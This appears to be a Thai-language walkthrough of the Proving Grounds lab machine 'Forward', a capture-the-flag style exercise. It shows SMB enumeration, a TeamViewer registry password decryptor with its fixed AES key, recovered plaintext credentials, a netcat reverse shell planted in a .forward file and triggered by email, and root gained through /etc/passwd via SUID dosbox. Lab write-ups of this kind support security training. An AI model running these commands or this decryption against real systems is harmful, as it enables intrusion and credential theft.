# Recon 

## Port Scan 

```bash
sudo ../Tools/scan.sh 192.168.220.157 
[*] Running rustscan...
[*] Running nmap on ports: 22,25,139,445
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 15:44 +07
Nmap scan report for 192.168.220.157
Host is up (0.036s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp  open  smtp        Exim smtpd
| smtp-commands: forward Hello nmap.scanme.org [192.168.45.164], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: FORWARD; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-17T08:44:49
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: forward
|   NetBIOS computer name: FORWARD\x00
|   Domain name: \x00
|   FQDN: forward
|_  System time: 2025-06-17T04:44:52-04:00

Service detection performed. Please report any incorrect results 
```

## SMB  

```bash
smbmap -H 192.168.220.157 -u '' -p ''                  
```

![[Challenge/ProvingGround/Forward/IMG/001.png]]

```bash
smbclient -N //192.168.220.157/utils -U anonymous
```

![[Challenge/ProvingGround/Forward/IMG/002.png]]

จากข้อมูลข้างต้นเป็น Teamviewer และมี password ทีถูกเข้ารหัสไว้

#  Teamviewer password Decrypt

![[Challenge/ProvingGround/Forward/IMG/003.png]]
https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0 

```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)
print('''
This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
Please check below mentioned registry values and enter its value manually without spaces.
"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"

''')
hex_str_cipher = input("Enter output from registry without spaces : ")
key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

password = raw_un.decode('utf-16')
print("Decrypted password is : ",password)
```

![[Challenge/ProvingGround/Forward/IMG/004.png]]

จากนั้นเราจะตัดคำโดยใช้ Cyber Chef 
![[Challenge/ProvingGround/Forward/IMG/005.png]]

```bash 
fox.reg:2c0fff76ca03d7c21c0d3c8b55edd8de37f89720ae6ed382d0ad2e70f97effea0b0c1cd901cbd1ad90fc601b9e40fc9c4baf65eec51962eb4edacc7c30a8a66b0cbd9f362ac0cad1598904aecb8b9610

giammy.reg:5c096a351b711bca32f10b08ad3b9c3923abc01030042d0327dd442dbd6131c8084f2f90a030b2a785d40a827a58859f

golemitratigunda.reg:b56b8e3d8d07b9fada10e7909805ec5286889b4b4fc442963c43877a5b0c6376

python3 -m venv venv 
source venv/bin/activate 
pip3 install hexdump 
pip3 install Crypto
pip3 install pycryptodome
python3 teamdcrypt.py 
```

![[Challenge/ProvingGround/Forward/IMG/006.png]]

```credential
fox:iparalipomenidellabatracomiomachia
alberobello:alberobello
giammy:hackmeifyoureable
golemitratigunda:bangladesh
mara:paralipomenibatracomiomachia
vale:cocomerirossi
```

ทดสอบเข้าใช้งาน smb ด้วย credential ที่ได้รับมา 
```bash
smbmap -H 192.168.90.157 -u fox -p iparalipomenidellabatracomiomachia
smbclient -N //192.168.220.157/fox -U fox --password=iparalipomenidellabatracomiomachia
```

![[Challenge/ProvingGround/Forward/IMG/007.png]]
![[Challenge/ProvingGround/Forward/IMG/008.png]]
# Shell as fox 

จากการตรวจสอบจะพบว่าเมื่อผู้ใช้ได้รับอีเมล อีเมลจะถูกส่งผ่านไฟล์ .forward ในไดเร็กทอรีโฮมของผู้ใช้ ดังนั้น หากเราสามารถเปลี่ยนแปลงเนื้อหาของไฟล์ .forward และส่งอีเมลถึงผู้ใช้ได้ เราก็สามารถรับ RCE ได้ โดยบนเครื่องเป้าหมายเราจะเห็นได้ว่ามีพอร์ต 25 ยังเปิดอยู่ในกล่องนี้ด้วย ดังนั้นการส่งอีเมลถึงผู้ใช้จึงไม่น่าจะมีปัญหา ขั้นแรก เราจะต้องสร้างไฟล์ .forward ที่จะให้  Reverse Shell กลับมาหาเรา จากนั้น ให้ลบไฟล์ .forward จากแชร์ SMB และอัปโหลดไฟล์ของตัวเอง

```bash
──(kali㉿kali)-[~/Desktop]
└─$ vim .forward     

┌──(kali㉿kali)-[~/Desktop]
└─$ cat .forward 
 | nc 192.168.45.164 4444 -e /bin/bash 

```
ดำเนินการลบไฟล์ .forward และ put ไฟล์ที่เราสร้าง 

![[Challenge/ProvingGround/Forward/IMG/009.png]]

เชือมต่อเมล์ด้วยคำสั่งต่อไปนี้ 
```bash
swaks --to fox@forward --server 192.168.220.157
```

หลังจากรันคำสั่งให้รอซักครู่ เราจะสามารถส่งเมลล์ไปหาปลายทางได้ 

![[Challenge/ProvingGround/Forward/IMG/010.png]]

![[Challenge/ProvingGround/Forward/IMG/011.png]]

# Shell as Root 

```bash
fox@forward:/home$ cd mara 
cd mara 
fox@forward:/home/mara$ ls -la 
ls -la 
total 12
drwxr-xr-x 2 root root 4096 Dec 18  2020 .
drwxr-xr-x 8 root root 4096 Jan  8  2021 ..
-rw-r--r-- 1 root root   64 Dec 18  2020 .bash_history
fox@forward:/home/mara$ cat .bash_history
cat .bash_history
sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191
fox@forward:/home/mara$ 

```

หากเราตรวจสอบข้อมูลภายใต้ mara จะมี .bash_history อยู่ ซึ่งจะพบว่ามีรหัสผ่าน ทั้งนี้ รหัสดังกล่าวเป็นของ fox 

## SUID Check

```bash
find / -perm -u=s -ls 2>/dev/null
```

![[Challenge/ProvingGround/Forward/IMG/012.png]]

ก่อนอื่นสร้างไฟล์ rootx สำหรับ copy ไปยัง /etc/passwd ด้วย dosbox 

Dosbox ปกติไม่ใช่โปรแกรมที่ทำงานแบบ **SUID** (Set User ID) ซึ่งหมายความว่ามันจะทำงานด้วยสิทธิ์สูงกว่าผู้ใช้ปกติ (ในที่นี้คือ **root** หรือผู้ดูแลระบบ) การที่มันมี SUID ถือเป็นเรื่องผิดปกติและเป็นช่องโหว่ได้

แม้ว่าเครื่องมืออย่าง GTFOBins จะบอกวิธีใช้ Dosbox ที่มี SUID ในการเขียนไฟล์ในฐานะ root ได้ แต่ก็มีปัญหาใหญ่คือ **Dosbox จะเพิ่ม "ขึ้นบรรทัดใหม่" (carriage return) ท้ายทุกบรรทัดที่เราเขียน** ทำให้การเพิ่มผู้ใช้ root ใหม่ในไฟล์ `/etc/passwd` หรือการใส่คำสั่งอันตรายใน cronjob (งานที่ตั้งเวลาไว้) **ไม่สำเร็จ** เพราะไฟล์จะเสียรูปแบบไป

### ใช้ Dosbox แบบกราฟิก

วิธีเดียวที่จะใช้ประโยชน์จากช่องโหว่ Dosbox SUID นี้ได้คือ **ต้องเปิดหน้าต่างกราฟิกของ Dosbox ขึ้นมา** ทำได้ง่าย ๆ โดย:

- **ตอน SSH เข้าเครื่อง ให้ใช้คำสั่ง `ssh -X user@host`**

การใส่ `-X` จะทำให้เมื่อเราสั่งรัน Dosbox บนเครื่องเป้าหมาย หน้าต่าง Dosbox แบบกราฟิกจะเด้งขึ้นมาบนเครื่องของเรา ทำให้เราสามารถโต้ตอบกับมันได้เหมือนโปรแกรมปกติ และสามารถทำสิ่งต่าง ๆ ที่ซับซ้อนกว่าการแค่เขียนไฟล์บรรทัดเดียวได้

```bash
sshpass -p CIARLARIELLOkj99 ssh -X fox@192.168.220.157   
cd /tmp 
cat rootx 
rootX:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash # Password: root 
dosbox 
```

![[Challenge/ProvingGround/Forward/IMG/013.png]]

![[Challenge/ProvingGround/Forward/IMG/014.png]]


# PWNED 